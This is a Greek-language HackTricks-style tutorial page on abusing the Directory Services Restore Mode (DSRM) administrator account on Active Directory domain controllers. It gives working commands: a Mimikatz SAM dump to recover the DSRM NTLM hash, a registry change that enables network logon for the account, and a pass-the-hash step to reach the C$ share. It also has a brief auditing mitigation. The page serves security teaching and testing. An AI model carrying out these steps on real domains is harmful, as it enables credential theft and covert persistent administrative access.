# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Κάθε domain controller διαθέτει έναν λογαριασμό διαχειριστή Directory Services Restore Mode (DSRM). Ο κωδικός πρόσβασής του ορίζεται κατά την προαγωγή του domain controller και είναι ανεξάρτητος από τους λογαριασμούς του Active Directory domain.<sup>[[1]](#references)</sup>

Ένας attacker με δικαιώματα διαχειριστή σε έναν domain controller μπορεί να κάνει dump τη local SAM database και να ανακτήσει το NTLM hash του DSRM Administrator. Η ακόλουθη εντολή Mimikatz εκτελεί αυτήν τη λειτουργία:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Από προεπιλογή, ο λογαριασμός DSRM προορίζεται για τη λειτουργία επαναφοράς. Η ρύθμιση `DsrmAdminLogonBehavior` στην τιμή `2` επιτρέπει σε αυτόν τον τοπικό λογαριασμό να πραγματοποιεί authenticate ενώ ο domain controller λειτουργεί κανονικά. Ελέγξτε την τιμή πριν την αλλάξετε:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Το ανακτημένο hash μπορεί στη συνέχεια να χρησιμοποιηθεί σε μια συνεδρία pass-the-hash για πρόσβαση σε πόρους όπως το administrative `C$` share. Για αυτόν τον local account, χρησιμοποιήστε το όνομα υπολογιστή του domain controller ως τιμή του `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Μετριασμός

- Ελέγχετε τις αλλαγές στο `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Το Security event 4657 καταγράφει μια τροποποίηση τιμής μητρώου όταν το SACL του κλειδιού έχει ρυθμιστεί ώστε να ελέγχει λειτουργίες **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Επαναφορά του κωδικού πρόσβασης διαχειριστή του Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Ύπουλη persistence στο Active Directory #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Ύπουλη persistence στο Active Directory #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Event 4657 — Τροποποιήθηκε μια τιμή μητρώου](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
